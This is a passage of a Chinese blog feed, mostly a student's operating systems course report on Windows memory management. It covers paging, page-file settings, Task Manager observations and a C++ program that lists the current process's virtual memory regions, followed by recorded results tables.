title="4.数据分析与建模"></a>4.数据分析与建模</h2><p>在这个部分需要了解基本的数据分析方法、数据挖掘算法，了解不同方法适用的场景和适合的问题。分析时应切忌滥用和误用统计分析方法。滥用和误用统计分析方法主要是由于对方法能解决哪类问题、方法适用的前提、方法对数据的要求不清等原因造成的。</p><p>另外，选择几种统计分析方法对数据进行探索性的反复分析也是极为重要的。每一种统计分析方法都有自己的特点和局限，因此，一般需要选择几种方法反复印证分析，仅依据一种分析方法的结果就断然下结论是不科学的。</p><p>比如你发现在一定条件下，销量和价格是正比关系，那么你可以据此建立一个线性回归模型，你发现价格和广告是非线性关系，你可以先建立一个逻辑回归模型来进行分析。</p><p>一般情况下，回归分析的方法可以满足很大一部分的分析需求，当然你也可以了解一些数据挖掘的算法、特征提取的方法来优化自己的模型，获得更好地结果。</p><h2 id="5-数据可视化及数据报告的撰写"><a href="#5-数据可视化及数据报告的撰写" class="headerlink" title="5.数据可视化及数据报告的撰写"></a>5.数据可视化及数据报告的撰写</h2><p>分析结果最直接的结果是统计量的描述和统计量的展示。</p><p>比如我们通过数据的分布发现数据分析工资最高的5个城市，目前各种语言的流行度排行榜，近几年北京空气质量的变化趋势，避孕套消费的地区分布……这些都是我们通过简单数据分析与可视化就可以展现出的结果。</p><p>另外一些则需要深入探究内部的关系，比如影响产品质量最关键的几个指标，你需要对不同指标与产品质量进行相关性分析之后才能得出正确结论。又比如你需要预测未来某个时间段的产品销量，则需要你对历史数据进行建模和分析，才能对未来的情况有更精准的预测。</p><p>数据分析报告不仅是分析结果的直接呈现，还是对相关情况的一个全面的认识。我们经常看到一些行业分析报告从不同角度、深入浅析地剖析各种关系。所以你需要一个讲故事的逻辑，如何从一个宏观的问题，深入、细化到问题内部的方方面面，得出令人信服的结果，这需要从实践中不断训练。</p><p>数据分析的一般流程总的来说就是这几个步骤：问题定义、数据获取、数据预处理、数据分析与建模、数据可视化与数据报告的撰写。</p>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 期末复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统课程设计(五)-内存管理</title>
      <link href="/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%BA%94-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%BA%94-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>（1） 通过对 Windows xp/7“任务管理器”、“计算机管理”、“我的电脑”属性、“系统信息”、“系统监视器”等程序的应用，学习如何察看和调整 Windows 的内存性能，加深对操作系统内存管理、虚拟存储管理等理论知识的理解。</p><p>（2） 了解 Windows xp/7 的内存结构和虚拟内存的管理，理解进程的虚拟内存空间和物理内存的映射关系。</p><h2 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a>总体设计</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>耗尽内存是 Windows 系统中最常见的问题之一。当系统耗尽内存时，所有进程对内存的总需求超出了系统的物理内存总量。随后，Windows 必须借助它的虚拟内存来维持系统和进程的运行。虚拟内存机制是 Windows 操作系统的重要组成部分，但它的速度比物理内存慢得多，因此，应该尽量避免耗尽物理内存资源，以免导致性能下降。解决内存不足问题的一个有效的方法就是添加更多的内存。但是，一旦提供了更多的内存，Windows 很可以会立即“吞食”。而事实上，添加更多的内存并非总是可行的，也可能只是推迟了实际问题的发生。因此，应该相信，优化所拥有的内存是非常关键的。</p><p>（1） 分页过程</p><p>当 Windows 求助于硬盘以获得虚拟内存时，这个过程被称为分页 (paging) 。分页就是将信息从主内存移动到磁盘进行临时存储的过程。当进程需要已经交换到硬盘上的代码或数据时，系统要将数据送回物理内存，并在必要时将其他信息传输到硬盘上，而硬盘与物理内存在性能上的差异极大。例如，硬盘的访问时间通常大约为 4-10 毫秒，而物理内存的访问时间为 60us，甚至更快。</p><p>（2） 内存共享</p><p>应用程序经常需要彼此通信和共享信息。为了提供这种能力，Windows 必须允许访问某些内存空间而不危及它和其他应用程序的安全性和完整性。从性能的角度来看，共享内存的能力大大减少了应用程序使用的内存数量。</p><p>（3） 未分页合并内存与分页合并内存</p><p>Windows 决定了系统内存组件哪些可以以及哪些不可以交换到磁盘上。显然，不应该将某些代码 (例如内核) 交换出主内存。因此，Windows 将系统使用的内存进一步划分为未分页合并内存和分页合并内存。分页合并内存是存储迟早需要的可分页代码或数据的内存部分。虽然可以将分页合并内存中的任何系统进程交换到磁盘上，但是它临时存储在主内存的这一部分，以防系统立刻需要它。在将系统进程交换到磁盘上之前，Windows 会交换其他进程。</p><p>未分页合并内存包含必须驻留在内存中的占用代码或数据。这种结构类似于早期的 MS-DOS</p><p>程序使用的结构，在 MS-DOS 中，相对较小的终止并驻留程序 (Terminate and Stay Resident，TSR) 在启动时加载到内存中。这些程序在系统重新启动或关闭之前一直驻留在内存的特定部分中。</p><p>（4）分页文件最重要的配置参数是大小。无论系统中有多少个分页文件，如果它们的大小不合适，那么系统就可能遇到性能问题。</p><p>如果初始值太小，那么系统可能必须扩大分页文件，以补偿额外的分页活动。当系统临时增加分页文件时，它必须在处理分页请求的同时创建新的空间。这时，系统将出现大量的页面错误，甚至可能出现系统失效。当系统必须在进程的工作区外部 (在物理内存或分页文件中的其他位置) 查找信息时，就会出现页面错误。当系统缺乏存储资源 (物理内存及虚拟内存) 来满足使用需求，从而遇到过多的分页时，就会出现系统失效。系统将花更多的时间来分页而不是执行应用程序。当系统失效时，Memory：Pages/see 计数器将持续高于每秒 100 页。系统失效严重降低了系统的性能。此外，动态扩展分页文件将导致碎片化。分页文件将散布在整个磁盘上而不是在启动时的连续空间中创建，从而增加了系统的开销，并导致系统性能降低。因此，应该尽量避免系统增加分页文件的大小。</p><h3 id="设计步骤"><a href="#设计步骤" class="headerlink" title="设计步骤"></a>设计步骤</h3><p>（1）观察和调整 Windows XP/7 的内存性能。</p><p>步骤 1：阅读“背景知识”，请回答：</p><ol><li><p>什么是“分页过程”？ </p></li><li><p>什么是“内存共享”？</p></li><li><p>什么是“未分页合并内存”和“分页合并内存”？</p></li></ol><p>Windows xp 中，未分页合并内存的最大限制是多少？</p><ol start="4"><li>Windows xp 分页文件默认设置的最小容量和最大容量是多少？</li></ol><p>步骤 2：登录进入 Windows xp。</p><p>步骤 3：查看包含多个实例的应用程序的内存需求。</p><ol><li><p>启动想要监视的应用程序，例如 Word。</p></li><li><p>右键单击任务栏以启动“任务管理器”。</p></li><li><p>在“Windows 任务管理器”对话框中选定“进程”选项卡。</p></li><li><p>向下滚动在系统上运行的进程列表，查找想要监视的应用程序。</p></li></ol><p>请在表5-1中记录：</p><p>“内存使用”列显示了该应用程序的一个实例正在使用的内存数量。</p><ol start="5"><li>启动应用程序的另一个实例并观察它的内存需求。</li></ol><p>请描述使用第二个实例占用的内存与使用第一个实例时的内存对比情况。</p><p>步骤 4：未分页合并内存。</p><p>估算未分页合并内存大小的最简单方法是使用“任务管理器”。未分页合并内存的估计值显示在“任务管理器”的“性能”选项卡的“核心内存”部分。见5.4</p><p>还可以使用“任务管理器”查看一个独立进程正在使用的未分页合并内存数量和分页合并内存数量。操作步骤如下：</p><ol><li><p>单击“Windows 任务管理器”的“进程”选项卡，然后从“查看”菜单中选择“选择列”命令，显示“进程”选项卡的可查看选项。</p></li><li><p>在“选择列”对话框中，选定“页面缓冲池”选项和“非页面缓冲池”选项旁边的复选框，然后单击“确定”按钮。</p></li></ol><p>返回 Windows Xp“任务管理器”的“进程”选项卡时，将看到其中增加显示了各个进程占用的分页合并内存数量和未分页合并内存数量。</p><p>仍以刚才打开观察的应用程序 (例如 Word) 为例，请在表5-2中记录：</p><p>从性能的角度来看，未分页合并内存越多，可以加载到这个空间的数据就越多。拥有的物理内存越多，未分页合并内存就越多。但未分页合并内存被限制为 256MB，因此添加超出这个限制的内存对未分页合并内存没有影响。</p><p>步骤 5：提高分页性能。</p><p>在 Windows xp 的安装过程中，将使用连续的磁盘空间自动创建分页文件(pagefile.sys) 。用户可以事先监视变化的内存需求并正确配置分页文件，使得当系统必须借助于分页时的性能达到最高。</p><p>虽然分页文件一般都放在系统分区的根目录下面，但这并不总是该文件的最佳位置。要想从分页获得最佳性能，应该首先检查系统的磁盘子系统的配置，以了解它是否有多个物理硬盘驱动器。</p><ol><li><p>在“开始”菜单中单击“设置” – “控制面板”命令，双击“管理工具”图标，再双击“计算机管理”图标。</p></li><li><p>在“计算机管理”窗口的左格选择“磁盘管理”管理单元来查看系统的磁盘配置。</p></li></ol><p>请在表5-3中记录：</p><p>如果系统只有一个硬盘，那么建议应该尽可能为系统配置额外的驱动器。这是因为：Windows</p><p>xp 最多可以支持在多个驱动器上分布的 16 个独立的分页文件。为系统配置多个分页文件可以实现对不同磁盘 I/O 请求的并行处理，这将大大提高 I/O 请求的分页文件性能。</p><p>步骤 6：计算分页文件的大小。</p><p>要想更改分页文件的位置或大小配置参数，可按以下步骤进行：</p><ol><li><p>右键单击桌面上的“我的电脑” （Win7 为计算机）图标并选定“属性” （Win7 为高级系统设置） 。</p></li><li><p>在“高级”选项卡上单击“性能选项”按钮。</p></li><li><p>单击对话框中的“虚拟内存”区域中的“更改”按钮。</p></li></ol><p>请记录：见5.4</p><ol start="4"><li><p>要想将另一个分页文件添加到现有配置，在“虚拟内存”对话框中选定一个还没有分页文件的驱动器，然后指定分页文件的初始值和最大值 (以兆字节表示) ，单击“设置”，然后单击“确定”。</p></li><li><p>要想更改现有分页文件的最大值和最小值，可选定分页文件所在的驱动器。然后指定分页文件的初始值和最大值，单击“设置”按钮，然后单击“确定”按钮。</p></li><li><p>在“性能选项”对话框中单击“确定”按钮。</p></li><li><p>单击“确定”按钮以关闭“系统特性”对话框。</p></li></ol><p>（2）了解和检测进程的虚拟内存空间。</p><p>步骤 1：创建一个“Win32 Consol Application”工程，然后拷贝清单 5-1 中的程序，编译成</p><p>可执行文件。</p><p>步骤 2：在 VC 的工具栏单击“Execute Program”(执行程序) 按钮，或者按 Ctrl + F5 键，或者在“命令提示符”窗口运行步骤 1 中生成的可执行文件。</p><p>步骤 3：根据运行结果，回答下列问题。见5.4</p><p>按 committed、reserved、free 等三种虚拟地址空间分别记录实验数据。其中“描述”是指对该组数据的简单描述，例如，对下列一组数据：</p><p>00010000 – 00012000 &lt;8.00KB&gt;  Committed,  READWRITE,  Private</p><p>可描述为：具有 READWRITE 权限的已调配私有内存区。</p><p>将系统当前的自由区 (free) 虚拟地址空间按表5-4格式记录。</p><p>将系统当前的已调配区 (committed) 虚拟地址空间按表5-5格式记录。</p><p>将系统当前的保留区 (reserved) 虚拟地址空间按表5-6格式记录。</p><h2 id="详细设计"><a href="#详细设计" class="headerlink" title="详细设计"></a>详细设计</h2><p>（1）了解和检测进程的虚拟内存空间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 工程 vmwalker</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;shlwapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Shlwapi.lib&quot;</span>)</span><br><span class="hljs-comment">// 以可读方式对用户显示保护的辅助方法。</span><br><span class="hljs-comment">// 保护标记表示允许应用程序对内存进行访问的类型</span><br><span class="hljs-comment">// 以及操作系统强制访问的类型</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">TestSet</span><span class="hljs-params">(DWORD dwTarget, DWORD dwMask)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ((dwTarget &amp;dwMask) == dwMask) ;&#125;<br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> SHOWMASK(dwTarget, type) \</span><br><span class="hljs-keyword">if</span> (TestSet(dwTarget, PAGE_#<span class="hljs-meta">#type) ) \</span><br>&#123;<span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; <span class="hljs-meta">#type; &#125;</span><br><span class="hljs-keyword">void</span> ShowProtection(DWORD dwTarget)<br>&#123;<br>    SHOWMASK(dwTarget, READONLY) ;<br>    SHOWMASK(dwTarget, GUARD) ;<br>    SHOWMASK(dwTarget, NOCACHE) ;<br>    SHOWMASK(dwTarget, READWRITE) ;<br>    SHOWMASK(dwTarget, WRITECOPY) ;<br>    SHOWMASK(dwTarget, EXECUTE) ;<br>    SHOWMASK(dwTarget, EXECUTE_READ) ;<br>    SHOWMASK(dwTarget, EXECUTE_READWRITE) ;<br>    SHOWMASK(dwTarget, EXECUTE_WRITECOPY) ;<br>    SHOWMASK(dwTarget, NOACCESS) ;&#125;<br><span class="hljs-comment">// 遍历整个虚拟内存并对用户显示其属性的工作程序的方法</span><br><span class="hljs-keyword">void</span> WalkVM(HANDLE hProcess)<br>&#123;<br><span class="hljs-comment">// 首先，获得系统信息</span><br>    SYSTEM_INFO si;<br>    :: ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si) ) ;<br>    :: GetSystemInfo(&amp;si) ;<br><span class="hljs-comment">// 分配要存放信息的缓冲区</span><br>    MEMORY_BASIC_INFORMATION mbi;<br>    :: ZeroMemory(&amp;mbi, <span class="hljs-keyword">sizeof</span>(mbi) ) ;<br><span class="hljs-comment">// 循环整个应用程序地址空间</span><br>    LPCVOID pBlock = (LPVOID) si.lpMinimumApplicationAddress;<br>    <span class="hljs-keyword">while</span> (pBlock &lt; si.lpMaximumApplicationAddress)<br>    &#123;<span class="hljs-comment">// 获得下一个虚拟内存块的信息</span><br>        <span class="hljs-keyword">if</span> (:: VirtualQueryEx(<br>                    hProcess,            <span class="hljs-comment">// 相关的进程</span><br>                    pBlock, <span class="hljs-comment">// 开始位置</span><br>                    &amp;mbi, <span class="hljs-comment">// 缓冲区</span><br>                    <span class="hljs-keyword">sizeof</span>(mbi))==<span class="hljs-keyword">sizeof</span>(mbi) )   <span class="hljs-comment">// 大小的确认</span><br>        &#123;<span class="hljs-comment">// 计算块的结尾及其大小</span><br>            LPCVOID pEnd = (PBYTE) pBlock + mbi.RegionSize;<br>            TCHAR szSize[MAX_PATH];<br>            :: StrFormatByteSize(mbi.RegionSize, szSize, MAX_PATH) ;<br>            <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span>.fill (<span class="hljs-string">&#x27;0&#x27;</span>) ;<br>            <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span>&lt;&lt; <span class="hljs-built_in">std</span> :: hex &lt;&lt; <span class="hljs-built_in">std</span> :: setw(<span class="hljs-number">8</span>) &lt;&lt; (DWORD) pBlock &lt;&lt; <span class="hljs-string">&quot;-&quot;</span><br>                    &lt;&lt; <span class="hljs-built_in">std</span> :: hex &lt;&lt; <span class="hljs-built_in">std</span> :: setw(<span class="hljs-number">8</span>) &lt;&lt; (DWORD) pEnd<br>                    &lt;&lt; (:: <span class="hljs-built_in">strlen</span>(szSize)==<span class="hljs-number">7</span>? <span class="hljs-string">&quot; (&quot;</span> : <span class="hljs-string">&quot; (&quot;</span>) &lt;&lt; szSize&lt;&lt; <span class="hljs-string">&quot;) &quot;</span> ;<br>            <span class="hljs-keyword">switch</span>(mbi.State)<br>            &#123;<br>            <span class="hljs-keyword">case</span> MEM_COMMIT :<br>                <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Committed&quot;</span> ; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MEM_FREE :<br>                <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Free&quot;</span> ; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MEM_RESERVE : <br>                <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Reserved&quot;</span> ; <span class="hljs-keyword">break</span>; &#125;<br>            <span class="hljs-keyword">if</span>(mbi.Protect==<span class="hljs-number">0</span> &amp;&amp; mbi.State!=MEM_FREE)<br>            &#123;<br>                mbi.Protect=PAGE_READONLY; &#125;<br>            ShowProtection(mbi.Protect);<br>            <span class="hljs-keyword">switch</span>(mbi.Type)<br>            &#123;<br>            <span class="hljs-keyword">case</span> MEM_IMAGE :<br>                <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;, Image&quot;</span> ; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MEM_MAPPED:<br>                <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;, Mapped&quot;</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MEM_PRIVATE :<br>                <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;, Private&quot;</span> ; <span class="hljs-keyword">break</span>;&#125;<br><span class="hljs-comment">// 检验可执行的影像</span><br>            TCHAR szFilename [MAX_PATH] ;<br>            <span class="hljs-keyword">if</span> (:: GetModuleFileName (<br>                        (HMODULE) pBlock,    <span class="hljs-comment">// 实际虚拟内存的模块句柄</span><br>                        szFilename, <span class="hljs-comment">//完全指定的文件名称</span><br>                        MAX_PATH)&gt;<span class="hljs-number">0</span>) <span class="hljs-comment">//实际使用的缓冲区大小</span><br>            &#123;<br><span class="hljs-comment">// 除去路径并显示</span><br>                :: PathStripPath(szFilename) ;<br>                <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;, Module: &quot;</span> &lt;&lt; szFilename; &#125;<br>            <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">// 移动块指针以获得下一下个块</span><br>            pBlock = pEnd; &#125; &#125; &#125;<br><span class="hljs-keyword">void</span> ShowVirtualMemory()<br>&#123;<br><span class="hljs-comment">// 首先，让我们获得系统信息</span><br>    SYSTEM_INFO si;<br>    :: ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si) ) ;<br>    :: GetSystemInfo(&amp;si) ;<br><span class="hljs-comment">// 使用外壳辅助程序对一些尺寸进行格式化</span><br>    TCHAR szPageSize[MAX_PATH];<br>    ::StrFormatByteSize(si.dwPageSize, szPageSize, MAX_PATH) ;<br>    <span class="hljs-number">26</span><br>    DWORD dwMemSize = (DWORD)si.lpMaximumApplicationAddress -(DWORD) si.lpMinimumApplicationAddress;<br>    TCHAR szMemSize [MAX_PATH] ;<br>    :: StrFormatByteSize(dwMemSize, szMemSize, MAX_PATH) ;<br><span class="hljs-comment">// 将内存信息显示出来</span><br>    <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Virtual memory page size: &quot;</span> &lt;&lt; szPageSize &lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span>.fill (<span class="hljs-string">&#x27;0&#x27;</span>) ;<br>    <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Minimum application address: 0x&quot;</span>&lt;&lt; <span class="hljs-built_in">std</span> :: hex &lt;&lt; <span class="hljs-built_in">std</span> :: setw(<span class="hljs-number">8</span>)<br>                &lt;&lt; (DWORD) si.lpMinimumApplicationAddress&lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Maximum application address: 0x&quot;</span>&lt;&lt; <span class="hljs-built_in">std</span> :: hex &lt;&lt; <span class="hljs-built_in">std</span> :: setw(<span class="hljs-number">8</span>)<br>                &lt;&lt; (DWORD) si.lpMaximumApplicationAddress&lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Total available virtual memory: &quot;</span>&lt;&lt; szMemSize &lt;&lt; <span class="hljs-built_in">std</span> :: <span class="hljs-built_in">endl</span> ; &#125;<br><span class="hljs-keyword">void</span> main()<br>&#123;<br><span class="hljs-comment">//显示虚拟内存的基本信息</span><br>    ShowVirtualMemory();<br><span class="hljs-comment">// 遍历当前进程的虚拟内存</span><br>    ::WalkVM(::GetCurrentProcess()); &#125;<br></code></pre></td></tr></table></figure><h2 id="5-4实验结果和分析"><a href="#5-4实验结果和分析" class="headerlink" title="5.4实验结果和分析"></a>5.4实验结果和分析</h2><p>（1）观察和调整 Windows XP/7 的内存性能。</p><p><strong>步骤1**</strong>：**</p><ol><li><p>分页过程：当 Windows 求助于硬盘以获得虚拟内存时，这个过程被称为分页。分页就是将信息从主内存移动到磁盘进行临时存储的过程。</p></li><li><p>内存共享：应用程序需要彼此通信和共享信息。</p></li><li><p>未分页合并内存：包含必须驻留在内存中的占用代码或数据。</p></li></ol><p>分页合并内存：存储迟早需要的可分页代码或数据的内存部分。</p><p>Windows xp 中，未分页合并内存的最大限制是：256MB (在 Windows NT 4 中的限制为 128MB) </p><p>4） Windows xp 使用内存容量的1.5倍作为分页文件的最小容量，这个最小容量的两倍作为最大容量。</p><p>​     <strong>步骤3**</strong>：**</p><p>表5-1 应用内存需求实验记录</p><table><thead><tr><th>映像名称</th><th>PID</th><th>CPU</th><th>时间</th><th>内存使用</th></tr></thead><tbody><tr><td>Chrome</td><td>11704</td><td>00</td><td>0:01:07</td><td>10,844k</td></tr></tbody></table><p>​     <strong>步骤4**</strong>：**</p><p>​     总数 ：248MB     分页数：179MB    未分页 ：69MB</p><p>表5-2 应用内存使用实验记录</p><table><thead><tr><th>映像名称</th><th>PID</th><th>内存使用</th><th>页面缓冲池</th><th>非页面缓冲池</th></tr></thead><tbody><tr><td>Chrome</td><td>11704</td><td>00</td><td>399k</td><td>10k</td></tr></tbody></table><p>​     <strong>步骤5**</strong>：**</p><p>表5-3 磁盘配置实验记录</p><table><thead><tr><th>卷</th><th>布局</th><th>类型</th><th>文件系统</th><th>容量</th><th>状态</th></tr></thead><tbody><tr><td>（C：）</td><td>简单</td><td>基本</td><td>NTFS</td><td>80.00GB</td><td>状态良好（系统，启动，页面文件，活动，故障转储，主分区）</td></tr><tr><td>（D：）</td><td>简单</td><td>基本</td><td>NTFS</td><td>15.00GB</td><td>良好（逻辑驱动器）</td></tr><tr><td>（E：）</td><td>简单</td><td>基本</td><td>NTFS</td><td>15.00GB</td><td>良好（逻辑驱动器）</td></tr><tr><td>（F：）</td><td>简单</td><td>基本</td><td>FAT32</td><td>49.99GB</td><td>良好（逻辑驱动器）</td></tr></tbody></table><p>所选驱动器的页面文件大小：</p><p>1_驱动器：C:  可用空间：55653MB  初始大小(MB)：无  最大值(MB)：无</p><p>2_驱动器：D:  可用空间：14611MB  初始大小(MB)：无  最大值(MB)：无</p><p>3_驱动器：E:   可用空间：15260MB  初始大小(MB)：无   最大值(MB)：无</p><p>4_驱动器：F:   可用空间：14110MB  初始大小(MB)：无   最大值(MB)：无</p><p>5_所有驱动器页面文件大小的总数：</p><p>允许的最小值：16MB     推荐：5266MB    当前已分配：3511MB</p><p>（2）了解和检测进程的虚拟内存空间。</p><p><strong>步骤3**</strong>：**</p><p>虚拟内存每页容量为：4.00KB  最小应用地址：0x00010000</p><p>最大应用地址：0x7ffeffff    当前可供应用程序使用的内存空间为：1.99GB</p><p>当前计算机的实际内存大小为：4.00GB</p><p>理论上每个 Windows 应用程序可以独占的最大存储空间是：4.00GB</p><p>表5-4 自由区虚拟地址空间实验记录</p><table><thead><tr><th>地址</th><th>大小</th><th>虚拟地址空间类型</th><th>访问权限</th><th>描述</th></tr></thead><tbody><tr><td>00134000-00140000</td><td>48.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>00141000-00150000</td><td>60.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>001b7000-001c0000</td><td>36.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>00388000-00390000</td><td>32.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>00391000-003a0000</td><td>60.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>003a1000-003b0000</td><td>60.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>003b7000-003c0000</td><td>36.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>003c2000-00400000</td><td>248KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>00485000-00520000</td><td>620KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>00631000-00640000</td><td>60.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>01240000-01310000</td><td>832KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>01717000-73f10000</td><td>1.78GB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>770d7000-77130000</td><td>356KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>77131000-7f6f0000</td><td>133MB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>7f7f0000-7ffa0000</td><td>7.68MB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存区</td></tr><tr><td>7ffd3000-7ffd7000</td><td>16.0KB</td><td>Free</td><td>NOACCESS</td><td>具有NOACCESS权限的内存